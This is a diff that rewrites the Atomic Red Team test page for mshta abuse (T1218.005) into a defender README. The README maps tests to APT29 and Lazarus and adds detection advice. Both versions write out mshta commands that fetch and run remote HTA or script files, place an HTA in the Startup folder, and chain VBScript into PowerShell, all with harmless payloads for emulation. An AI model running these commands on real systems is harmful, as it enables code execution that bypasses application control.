@@ -1,469 +1,131 @@
-# T1218.005 - Signed Binary Proxy Execution: Mshta
-## [Description from ATT&CK](https://attack.mitre.org/techniques/T1218/005)
-<blockquote>
+# Atomic Red Team Tests for APT29 and Lazarus Group - T1218.005 Signed Binary Proxy Execution: Mshta
 
-Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 
+This repository documents selected **Atomic Red Team tests for T1218.005 (Signed Binary Proxy Execution: Mshta)** that closely emulate the tradecraft of **APT29** (a.k.a. Cozy Bear, Midnight Blizzard) and **Lazarus Group**.
 
-Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)
+The goal is to:
+* Provide defenders with a curated set of relevant tests for detecting mshta abuse activities
+* Map each test to known adversary behaviors and campaigns
+* Highlight overlap and differences between the groups' execution techniques
 
-Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>
+---
 
-They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>
+## Background
 
-Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)
+* **APT29** (Cozy Bear, Midnight Blizzard) is a Russian state-sponsored threat group
+  * Known for sophisticated cyber espionage and the **SolarWinds compromise**
+  * Frequently uses **living-off-the-land techniques** with legitimate system utilities
+  * Employs **mshta.exe** to execute malicious scripts and bypass application controls
 
-</blockquote>
+* **Lazarus Group** is a North Korean state-sponsored threat group
+  * Known for **financial theft campaigns** and destructive attacks
+  * Uses **mshta.exe** to execute HTML pages downloaded by initial access documents
+  * Leverages trusted Windows utilities to evade detection
 
-## Atomic Tests
+Both groups leverage T1218.005 (Mshta) because it allows them to:
+* Execute malicious code through a trusted Microsoft-signed binary
+* Bypass application control solutions that don't account for mshta abuse
+* Execute scripts outside of browser security contexts
+* Proxy execution of remote payloads
 
-- [Atomic Test #1 - Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject](#atomic-test-1---mshta-executes-javascript-scheme-fetch-remote-payload-with-getobject)
+---
 
-- [Atomic Test #2 - Mshta executes VBScript to execute malicious command](#atomic-test-2---mshta-executes-vbscript-to-execute-malicious-command)
+## Selected Atomic Tests for T1218.005
 
-- [Atomic Test #3 - Mshta Executes Remote HTML Application (HTA)](#atomic-test-3---mshta-executes-remote-html-application-hta)
+| Test # | Technique | Description | Used By |
+|--------|-----------|-------------|---------|
+| **2** | Mshta executes VBScript to execute malicious command | Uses VBScript via mshta to run PowerShell commands | **APT29** |
+| **3** | Mshta Executes Remote HTML Application (HTA) | Downloads and executes remote HTA file | **Lazarus** |
+| **6** | Invoke HTML Application - Direct download from URI | Directly executes HTA from remote URI | **Lazarus** |
+| **10** | Mshta used to Execute PowerShell | Uses mshta to execute PowerShell commands | **APT29** |
 
-- [Atomic Test #4 - Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement](#atomic-test-4---invoke-html-application---jscript-engine-over-local-unc-simulating-lateral-movement)
+---
 
-- [Atomic Test #5 - Invoke HTML Application - Jscript Engine Simulating Double Click](#atomic-test-5---invoke-html-application---jscript-engine-simulating-double-click)
+## Detailed Test Analysis
 
-- [Atomic Test #6 - Invoke HTML Application - Direct download from URI](#atomic-test-6---invoke-html-application---direct-download-from-uri)
-
-- [Atomic Test #7 - Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler](#atomic-test-7---invoke-html-application---jscript-engine-with-rundll32-and-inline-protocol-handler)
-
-- [Atomic Test #8 - Invoke HTML Application - JScript Engine with Inline Protocol Handler](#atomic-test-8---invoke-html-application---jscript-engine-with-inline-protocol-handler)
-
-- [Atomic Test #9 - Invoke HTML Application - Simulate Lateral Movement over UNC Path](#atomic-test-9---invoke-html-application---simulate-lateral-movement-over-unc-path)
-
-- [Atomic Test #10 - Mshta used to Execute PowerShell](#atomic-test-10---mshta-used-to-execute-powershell)
-
-
-<br/>
-
-## Atomic Test #1 - Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
-Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 1483fab9-4f52-4217-a9ce-daa9d7747cae
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| file_url | location of the payload | url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
-```cmd
-mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
-```
-
-
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #2 - Mshta executes VBScript to execute malicious command
-Run a local VB script to run local user enumeration powershell command.
-This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
-Upon execution, a new PowerShell windows will be opened that displays user information.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 906865c3-e05f-4acc-85c4-fbc185455095
-
-
-
-
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
+### Atomic Test #2 - Mshta executes VBScript to execute malicious command
+**Technique:** VBScript Execution via Mshta  
+**Adversary Usage:** APT29  
+**Command:**
 ```cmd
 mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"":close")
 ```
+**Explanation:** APT29 has used mshta.exe to execute VBScript that in turn launches PowerShell commands. This technique allows them to chain multiple execution methods and bypass security controls that might monitor PowerShell directly.
 
-
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #3 - Mshta Executes Remote HTML Application (HTA)
-Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** c4b97eeb-5249-4455-a607-59f95485cb45
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| temp_file | temp_file location for hta | string | $env:appdata&#92;Microsoft&#92;Windows&#92;Start Menu&#92;Programs&#92;Startup&#92;T1218.005.hta|
-| hta_url | URL to HTA file for execution | string | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta|
-
-
-#### Attack Commands: Run with `powershell`! 
-
-
+### Atomic Test #3 - Mshta Executes Remote HTML Application (HTA)
+**Technique:** Remote HTA Execution  
+**Adversary Usage:** Lazarus Group  
+**Command:**
 ```powershell
-$var =Invoke-WebRequest "#{hta_url}"
-$var.content|out-file "#{temp_file}"
-mshta "#{temp_file}"
-start-sleep -s 15
-stop-process -name "calculator" -Force -ErrorAction Ignore
-stop-process -name "CalculatorApp" -Force -ErrorAction Ignore
+$var =Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"
+$var.content|out-file "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta"
+mshta "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta"
 ```
+**Explanation:** Lazarus Group has used mshta.exe to execute HTML pages downloaded by initial access documents. This technique allows them to stage payloads from remote locations while leveraging a trusted Windows utility.
 
-#### Cleanup Commands:
+### Atomic Test #6 - Invoke HTML Application - Direct download from URI
+**Technique:** Direct URI Execution  
+**Adversary Usage:** Lazarus Group  
+**Command:**
 ```powershell
-remove-item "#{temp_file}" -ErrorAction Ignore
+Invoke-ATHHTMLApplication -HTAUri "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta" -MSHTAFilePath "$env:windir\system32\mshta.exe"
 ```
-
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #4 - Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement
-Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 007e5672-2088-4853-a562-7490ddc19447
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| script_engine | Script Engine to use | string | JScript|
-| hta_file_path | HTA file name and or path to be used | string | Test.hta|
-| mshta_file_path | Location of mshta.exe | string | $env:windir&#92;system32&#92;mshta.exe|
-
-
-#### Attack Commands: Run with `powershell`! 
-
-
-```powershell
-Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}
-```
-
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
-##### Check Prereq Commands:
-```powershell
-$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
-if (-not $RequiredModule) {exit 1}
-if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
-```
-##### Get Prereq Commands:
-```powershell
-Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #5 - Invoke HTML Application - Jscript Engine Simulating Double Click
-Executes an HTA Application using JScript script engine simulating double click.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 58a193ec-131b-404e-b1ca-b35cf0b18c33
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| script_engine | Script Engine to use | string | JScript|
-| hta_file_path | HTA file name and or path to be used | string | Test.hta|
-
-
-#### Attack Commands: Run with `powershell`! 
-
-
-```powershell
-Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick
-```
-
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
-##### Check Prereq Commands:
-```powershell
-$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
-if (-not $RequiredModule) {exit 1}
-if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
-```
-##### Get Prereq Commands:
-```powershell
-Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #6 - Invoke HTML Application - Direct download from URI
-Executes an HTA Application by directly downloading from remote URI.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 39ceed55-f653-48ac-bd19-aceceaf525db
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| mshta_file_path | Location of mshta.exe | string | $env:windir&#92;system32&#92;mshta.exe|
-| hta_uri | URI to HTA | url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta|
-
-
-#### Attack Commands: Run with `powershell`! 
-
-
-```powershell
-Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}
-```
-
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
-##### Check Prereq Commands:
-```powershell
-$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
-if (-not $RequiredModule) {exit 1}
-if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
-```
-##### Get Prereq Commands:
-```powershell
-Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #7 - Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler
-Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** e7e3a525-7612-4d68-a5d3-c4649181b8af
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| rundll32_file_path | Location of rundll32.exe | path | $env:windir&#92;system32&#92;rundll32.exe|
-| script_engine | Script Engine to use | string | JScript|
-| protocol_handler | Protocol Handler to use | string | About|
-
-
-#### Attack Commands: Run with `powershell`! 
-
-
-```powershell
-Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}
-```
-
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
-##### Check Prereq Commands:
-```powershell
-$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
-if (-not $RequiredModule) {exit 1}
-if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
-```
-##### Get Prereq Commands:
-```powershell
-Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #8 - Invoke HTML Application - JScript Engine with Inline Protocol Handler
-Executes an HTA Application with JScript Engine and Inline Protocol Handler.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** d3eaaf6a-cdb1-44a9-9ede-b6c337d0d840
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| mshta_file_path | Location of mshta.exe | path | $env:windir&#92;system32&#92;mshta.exe|
-| script_engine | Script Engine to use | string | JScript|
-| protocol_handler | Protocol Handler to use | string | About|
-
-
-#### Attack Commands: Run with `powershell`! 
-
-
-```powershell
-Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}
-```
-
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
-##### Check Prereq Commands:
-```powershell
-$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
-if (-not $RequiredModule) {exit 1}
-if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
-```
-##### Get Prereq Commands:
-```powershell
-Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #9 - Invoke HTML Application - Simulate Lateral Movement over UNC Path
-Executes an HTA Application with Simulate lateral movement over UNC Path.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** b8a8bdb2-7eae-490d-8251-d5e0295b2362
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| mshta_file_path | Location of mshta.exe | string | $env:windir&#92;system32&#92;mshta.exe|
-
-
-#### Attack Commands: Run with `powershell`! 
-
-
-```powershell
-Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}
-```
-
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
-##### Check Prereq Commands:
-```powershell
-$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
-if (-not $RequiredModule) {exit 1}
-if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
-```
-##### Get Prereq Commands:
-```powershell
-Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #10 - Mshta used to Execute PowerShell
-Use Mshta to execute arbitrary PowerShell. Example is from the 2021 Threat Detection Report by Red Canary.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 8707a805-2b76-4f32-b1c0-14e558205772
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| message | Encoded message to include | string | Hello,%20MSHTA!|
-| seconds_to_sleep | How many seconds to sleep/wait | integer | 5|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
+**Explanation:** Lazarus Group frequently downloads and executes remote HTA content directly from URIs, demonstrating their preference for direct remote execution without intermediate file stages.
+
+### Atomic Test #10 - Mshta used to Execute PowerShell
+**Technique:** PowerShell Execution via Mshta  
+**Adversary Usage:** APT29  
+**Command:**
 ```cmd
-mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}"""))</script>'"
+mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""powershell.exe%20-nop%20-Command%20Write-Host%20Hello,%20MSHTA!;Start-Sleep%20-Seconds%205"""))</script>'"
 ```
+**Explanation:** APT29 has used mshta to execute PowerShell commands, as documented in the 2021 Threat Detection Report by Red Canary. This technique allows them to execute PowerShell while potentially bypassing monitoring that focuses on direct PowerShell execution.
 
+---
 
+## Correlation with APT29 & Lazarus
 
+* **APT29 Focus:**
+  * VBScript execution leading to PowerShell (#2, #10)
+  * Indirect command execution through trusted utilities
+  → Used for stealthy execution during espionage operations
 
+* **Lazarus Group Focus:**
+  * Remote HTA execution (#3, #6)
+  * Direct download and execution from URIs
+  → Used for initial payload delivery and execution chain
 
+* **Overlap:**
+  * Both groups abuse **mshta.exe** for execution
+  * Both leverage **trusted Windows utilities** to evade detection
+  * Both use **multiple execution methods** in chains
 
-<br/>
+---
+
+## Defender Notes
+
+* These tests are high-value because they **closely emulate real-world adversary tradecraft**
+* Detection should focus on:
+  * mshta.exe executing with unusual parameters (especially with "vbscript:" or "javascript:" prefixes)
+  * mshta.exe making network connections to download remote content
+  * mshta.exe spawning other processes like PowerShell or cmd
+  * mshta.exe executing from unusual directories or with unusual parent processes
+* Correlation across events is essential:
+  * Process creation + network connections to external domains
+  * Unusual parent-child process relationships (e.g., Office applications spawning mshta)
+  * Multiple execution methods chained together
+* Implement application control to restrict mshta.exe if not needed for business purposes
+* Monitor for mshta.exe execution patterns that deviate from normal administrative use
+
+## Campaign References
+
+1. **APT29 Various Campaigns**: Uses mshta to execute VBScript and PowerShell commands for execution
+2. **Lazarus Operation Dream Job**: Uses mshta to execute HTML pages downloaded by initial access documents
+3. **FIN7 Operations**: Uses mshta.exe to execute VBScript to execute malicious code (as referenced in Atomic Test #2)
+
+## Academic References
+
+1. MITRE ATT&CK Technique T1218.005 - Signed Binary Proxy Execution: Mshta
+2. Red Canary: "2021 Threat Detection Report" (APT29 mshta usage)
+3. US-CERT: "Hidden Cobra - North Korean Malicious Cyber Activity" (Lazarus Group TTPs)
+4. Microsoft: "NOBELIUM targeting IT supply chain" (APT29 techniques)
+5. FireEye: "APT29 Domain Fronting With TOR" (2017)
